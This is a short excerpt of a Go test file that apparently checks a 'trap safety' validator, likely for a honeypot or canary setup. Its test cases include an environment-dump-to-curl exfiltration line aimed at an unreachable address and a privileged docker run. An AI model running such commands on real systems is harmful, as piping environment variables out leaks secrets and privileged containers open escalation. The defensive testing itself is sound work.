...
func TestValidateTrapSafety_AcceptsSafe(t *testing.T) {
	...
	tests := []struct {
		...
		{"curl unreachable", []string{"env | curl -X POST -d @- http://0.0.0.0:1/intake"}},
		...
		{"docker fake image", []string{"docker run --privileged aegis-trap-image:nonexistent sh"}},
		...
		{"echo fake vars", []string{"echo \"DB_URL=$AEGIS_TRAP_DB_URL\""}},
